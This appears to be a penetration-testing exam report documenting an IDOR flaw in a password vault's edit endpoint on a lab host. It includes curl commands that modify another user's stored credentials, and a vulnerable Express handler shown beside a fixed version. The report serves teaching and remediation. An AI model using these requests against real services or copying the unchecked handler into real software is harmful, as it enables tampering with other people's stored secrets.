# FailSafe PWPA Exam - Phase 3: Vault Edit IDOR Testing

**Date:** January 18, 2026
**Target:** http://10.0.0.10/vault/edit

---

## IDOR Vulnerability Testing - Vault Edit Endpoint

### Vulnerability: Insecure Direct Object Reference (IDOR) - 25 points

**Description:**  
The vault edit endpoint (`PUT /vault/edit/:itemId`) fails to properly validate user authorization. An authenticated user can modify vault items belonging to other users by directly specifying the target item ID in the URL. The application does not verify that the authenticated user owns the vault item before allowing modifications.

**Impact:**  
Attackers can modify, corrupt, or delete other users' stored credentials. This allows unauthorized access to and manipulation of sensitive vault data, leading to complete compromise of other users' accounts and data integrity.

**Technical Details:**

**Vulnerable Endpoint:** PUT /vault/edit/:itemId
**Vulnerability Type:** Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA)
**Authentication Required:** Yes (valid session cookie)
**Authorization Check:** Missing/Insufficient

---

## Step-by-Step Recreation

### Prerequisites:
- Valid session cookie for authenticated user
- Knowledge of target vault item IDs
- Access to curl or Burp Suite

### Accounts Used:
- **Attacker Account :** testuser1 (authenticated)
- **Target Account :** testuser2, Any other user's vault items

### Step 1: Create Test Victim Account and Item

**Create a test account (victim):**
```bash
curl -X POST http://10.0.0.10/register \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"victim123"}'
```

**Login as victim and create a vault item:**
```bash
curl -X POST http://10.0.0.10/login \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"victim123"}'
# Capture session cookie from response
```

**Add item to victim's vault:**
```bash
curl -X POST http://10.0.0.10/vault/add \
  -H "Cookie: [victim_session]" \
  -H "Content-Type: application/json" \
  -d '{"vaulttitle":"Victim Secret","vaultusername":"admin","vaultpassword":"secretpass"}'
```

**Note the item ID** from victim's vault page or Burp intercept (typically sequential, e.g., ID 25).

### Step 2: Edit Victim's Item from Attacker Account

**From attacker account, edit the victim's item using the noted ID:**
```bash
curl -X PUT http://10.0.0.10/vault/edit/25 \
  -H "Cookie: [attacker_session]" \
  -H "Content-Type: application/json" \
  -d '{"itemId":"25","vaulttitle":"HACKED BY IDOR","vaultusername":"hacked","vaultpassword":"compromised"}'
```

**Response:** `{"success":true,"message":"Item updated successfully!"}`

### Step 3: Verify Impact

**Login as victim and check vault** - the item shows modified data, confirming IDOR.

---

## CVSS v3.1 Score

**CVSS v3.1 Score:** 8.8 (High)  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  
**Rationale:** Network attack, low complexity, low privileges required (authenticated user), no user interaction, unchanged scope, high confidentiality/integrity/availability impact.

**Likelihood / Exploitability:**
- **Exploitability:** Easy - simple parameter modification
- **Required Access Level:** Low (authenticated user)
- **Technical Skill Required:** Low
- **Available Tools:** curl, Burp Suite

---

## Remediation

1. **Implement Authorization Checks:**
   ```javascript
   // Vulnerable
   app.put('/vault/edit/:itemId', (req, res) => {
     const itemId = req.params.itemId;
     db.query("UPDATE vault SET title = ? WHERE id = ?", [req.body.vaulttitle, itemId]);
     res.json({ success: true, message: "Item updated successfully!" });
   });

   // Secure
   app.put('/vault/edit/:itemId', (req, res) => {
     const itemId = req.params.itemId;
     const userId = req.session.userId;
     
     // Verify item belongs to authenticated user
     const item = db.query("SELECT * FROM vault WHERE id = ? AND user_id = ?", [itemId, userId]);
     if (!item) {
       return res.status(403).json({ success: false, message: "Unauthorized" });
     }
     
     db.query("UPDATE vault SET title = ? WHERE id = ? AND user_id = ?", [req.body.vaulttitle, itemId, userId]);
     res.json({ success: true, message: "Item updated successfully!" });
   });
   ```

2. **Verify Ownership Before Operations:**
   - Always check that the authenticated user owns the resource
   - Use session user ID, not user-supplied parameters

3. **Implement Role-Based Access Control (RBAC)**

4. **Add Audit Logging:**
   - Log all vault modifications
   - Monitor for suspicious patterns

---

## Status

**Status:** Confirmed  
**Severity:** High  
**Points:** 25 (IDOR/Broken Object Level Authorization)

---

## Screenshots

[Screenshots to be added here]
- Screenshot of successful IDOR edit request
- Screenshot of modified vault item in vault display
- Screenshot of curl command and response showing successful modification
